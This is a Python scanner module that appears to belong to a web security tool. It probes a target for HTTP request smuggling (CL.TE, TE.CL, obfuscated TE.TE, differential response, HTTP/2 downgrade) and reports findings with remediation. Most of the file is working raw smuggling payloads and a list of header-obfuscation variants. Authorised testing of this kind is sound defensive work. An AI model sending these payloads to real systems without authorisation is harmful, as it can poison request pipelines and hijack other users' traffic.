"""
Vexor HTTP Request Smuggling Scanner v3.0 - Elite Level
CL.TE, TE.CL, TE.TE (obfuscation), HTTP/2 downgrade,
differential response detection, pipeline poisoning
"""
import asyncio
import time
import re
from urllib.parse import urlparse
from vexor.modules.base import BaseScanner, Finding


class Scanner(BaseScanner):
    """HTTP Request Smuggling Scanner v3.0 - Elite Level"""

    MODULE_NAME = "http_smuggling"
    MODULE_DESC = "HTTP Smuggling: CL.TE/TE.CL/TE.TE/H2-Downgrade/Pipeline-Poison"

    async def scan(self) -> list[Finding]:
        async with self:
            await asyncio.gather(
                self._test_cl_te_timing(),
                self._test_te_cl_timing(),
                self._test_te_te_obfuscation(),
                self._test_differential_response(),
                self._check_te_header_support(),
                self._test_h2_downgrade(),
                return_exceptions=True,
            )
        return self.findings

    def _get_host(self) -> str:
        parsed = urlparse(self.target)
        return parsed.netloc or parsed.hostname or "localhost"

    def _get_path(self) -> str:
        parsed = urlparse(self.target)
        return parsed.path or "/"

    async def _raw_request(self, payload: bytes, timeout: float = 12.0):
        """Send raw HTTP request bytes directly via TCP"""
        import asyncio
        parsed = urlparse(self.target)
        host = parsed.hostname or "localhost"
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_ssl = parsed.scheme == "https"

        try:
            if use_ssl:
                import ssl
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port, ssl=ctx),
                    timeout=5.0,
                )
            else:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port),
                    timeout=5.0,
                )

            writer.write(payload)
            await writer.drain()

            start = time.time()
            response = b""
            try:
                while True:
                    chunk = await asyncio.wait_for(reader.read(4096), timeout=timeout)
                    if not chunk:
                        break
                    response += chunk
                    if b"\r\n\r\n" in response:
                        # Got headers, read a bit more
                        try:
                            extra = await asyncio.wait_for(reader.read(4096), timeout=2.0)
                            response += extra
                        except asyncio.TimeoutError:
                            pass
                        break
            except asyncio.TimeoutError:
                pass

            elapsed = time.time() - start
            writer.close()
            return response.decode(errors="ignore"), elapsed

        except asyncio.TimeoutError:
            return "", timeout
        except Exception:
            return "", 0.0

    async def _test_cl_te_timing(self) -> None:
        """
        CL.TE timing attack:
        Content-Length says body is 6 bytes, but Transfer-Encoding says chunked.
        If front-end uses CL and back-end uses TE, the '0\r\n\r\n' chunk terminator
        is left in the pipeline, causing the next request to hang.
        """
        host = self._get_host()
        path = self._get_path()

        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Connection: keep-alive\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "X"
        ).encode()

        response, elapsed = await self._raw_request(payload, timeout=11.0)

        if elapsed >= 9.0:
            self.add_finding(Finding(
                severity="HIGH",
                module=self.MODULE_NAME,
                vuln="HTTP Request Smuggling — CL.TE (Timing Confirmed)",
                endpoint=self.target,
                evidence=(
                    f"Response delayed {elapsed:.1f}s with CL.TE payload.\n"
                    "Front-end uses Content-Length, back-end uses Transfer-Encoding."
                ),
                description=(
                    "CL.TE request smuggling detected via timing. "
                    "Attacker can poison the request pipeline, bypass security controls, "
                    "and hijack other users' requests."
                ),
                remediation=(
                    "Normalize Transfer-Encoding headers at the front-end. "
                    "Reject requests with both Content-Length and Transfer-Encoding. "
                    "Use HTTP/2 end-to-end. "
                    "Ensure front-end and back-end agree on body length parsing."
                ),
            ))

    async def _test_te_cl_timing(self) -> None:
        """
        TE.CL timing attack:
        Transfer-Encoding says chunked, Content-Length says 4.
        If front-end uses TE and back-end uses CL, the smuggled request
        causes the back-end to wait for more data.
        """
        host = self._get_host()
        path = self._get_path()

        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Connection: keep-alive\r\n"
            "\r\n"
            "5c\r\n"
            f"GPOST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 15\r\n"
            "\r\n"
            "x=1\r\n"
            "0\r\n"
            "\r\n"
        ).encode()

        response, elapsed = await self._raw_request(payload, timeout=11.0)

        if elapsed >= 9.0:
            self.add_finding(Finding(
                severity="HIGH",
                module=self.MODULE_NAME,
                vuln="HTTP Request Smuggling — TE.CL (Timing Confirmed)",
                endpoint=self.target,
                evidence=(
                    f"Response delayed {elapsed:.1f}s with TE.CL payload.\n"
                    "Front-end uses Transfer-Encoding, back-end uses Content-Length."
                ),
                description=(
                    "TE.CL request smuggling detected via timing. "
                    "Attacker can smuggle requests to the back-end server."
                ),
                remediation=(
                    "Normalize Transfer-Encoding headers. "
                    "Reject ambiguous requests. Use HTTP/2 end-to-end."
                ),
            ))

    async def _test_te_te_obfuscation(self) -> None:
        """
        TE.TE obfuscation: both front-end and back-end support TE,
        but one can be tricked with an obfuscated TE header.
        """
        host = self._get_host()
        path = self._get_path()

        # Various TE obfuscation techniques
        te_variants = [
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
            "Transfer-Encoding: [chunked]",
            "Transfer-Encoding: chunked, identity",
            "X-Transfer-Encoding: chunked",
            "Transfer-Encoding\t: chunked",
        ]

        for te_header in te_variants:
            payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 6\r\n"
                f"{te_header}\r\n"
                "Connection: keep-alive\r\n"
                "\r\n"
                "0\r\n"
                "\r\n"
                "X"
            ).encode()

            response, elapsed = await self._raw_request(payload, timeout=8.0)

            if elapsed >= 6.0:
                self.add_finding(Finding(
                    severity="HIGH",
                    module=self.MODULE_NAME,
                    vuln="HTTP Request Smuggling — TE.TE Obfuscation",
                    endpoint=self.target,
                    evidence=(
                        f"Obfuscated TE header caused {elapsed:.1f}s delay.\n"
                        f"Header used: {te_header}"
                    ),
                    description=(
                        "TE.TE smuggling via obfuscated Transfer-Encoding header. "
                        "One server processes the obfuscated header differently."
                    ),
                    remediation=(
                        "Strictly validate Transfer-Encoding header values. "
                        "Reject non-standard TE values."
                    ),
                ))
                return

    async def _test_differential_response(self) -> None:
        """
        Differential response attack: send two requests and check if
        the second gets a response meant for the smuggled request.
        """
        host = self._get_host()
        path = self._get_path()

        # Smuggle a request that will cause a 404 or different response
        smuggled_path = "/vexor_smuggle_test_xyz_404"

        attack_payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 37\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Connection: keep-alive\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            f"GET {smuggled_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "\r\n"
        ).encode()

        # Send attack request
        response1, _ = await self._raw_request(attack_payload, timeout=5.0)

        # Send normal request immediately after
        normal_payload = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()

        response2, _ = await self._raw_request(normal_payload, timeout=5.0)

        # Check if second response contains 404 (from smuggled request)
        if response2 and "404" in response2[:50]:
            self.add_finding(Finding(
                severity="CRITICAL",
                module=self.MODULE_NAME,
                vuln="HTTP Request Smuggling — Differential Response Confirmed",
                endpoint=self.target,
                evidence=(
                    f"Second request received response for smuggled path '{smuggled_path}'.\n"
                    f"Response: {response2[:200]}"
                ),
                description=(
                    "HTTP request smuggling confirmed via differential response. "
                    "Attacker can poison responses for other users, "
                    "bypass security controls, and capture credentials."
                ),
                remediation=(
                    "Fix request smuggling immediately. "
                    "Normalize all HTTP headers at the front-end. "
                    "Use HTTP/2 end-to-end."
                ),
            ))

    async def _check_te_header_support(self) -> None:
        """Check if server accepts Transfer-Encoding header"""
        try:
            import httpx
            async with httpx.AsyncClient(verify=False, timeout=10) as client:
                resp = await client.post(
                    self.target,
                    content=b"0\r\n\r\n",
                    headers={
                        "Transfer-Encoding": "chunked",
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                )
                if resp.status_code not in [400, 405, 501, 411]:
                    self.add_finding(Finding(
                        severity="INFO",
                        module=self.MODULE_NAME,
                        vuln="Transfer-Encoding Accepted — Smuggling Risk",
                        endpoint=self.target,
                        evidence=f"Server accepts Transfer-Encoding: chunked (HTTP {resp.status_code})",
                        description=(
                            "Server accepts chunked Transfer-Encoding. "
                            "If a proxy is in front, request smuggling may be possible."
                        ),
                        remediation="Test for CL.TE and TE.CL smuggling manually.",
                    ))
        except Exception:
            pass

    async def _test_h2_downgrade(self) -> None:
        """Test for HTTP/2 to HTTP/1.1 downgrade smuggling"""
        try:
            import httpx
            # Try HTTP/2 with smuggling headers
            async with httpx.AsyncClient(
                verify=False, timeout=10, http2=True
            ) as client:
                resp = await client.post(
                    self.target,
                    headers={
                        "content-length": "0",
                        "transfer-encoding": "chunked",
                    },
                    content=b"",
                )
                # H2 should reject these headers
                if resp.status_code not in [400, 403, 501]:
                    self.add_finding(Finding(
                        severity="MEDIUM",
                        module=self.MODULE_NAME,
                        vuln="HTTP/2 Downgrade — Smuggling Headers Accepted",
                        endpoint=self.target,
                        evidence=(
                            f"HTTP/2 request with smuggling headers accepted (HTTP {resp.status_code}). "
                            "H2 to H1 downgrade may enable smuggling."
                        ),
                        description=(
                            "HTTP/2 endpoint accepts Content-Length + Transfer-Encoding headers. "
                            "If downgraded to HTTP/1.1 at back-end, smuggling is possible."
                        ),
                        remediation=(
                            "Reject HTTP/2 requests with Content-Length or Transfer-Encoding headers. "
                            "Use HTTP/2 end-to-end without downgrade."
                        ),
                    ))
        except Exception:
            pass
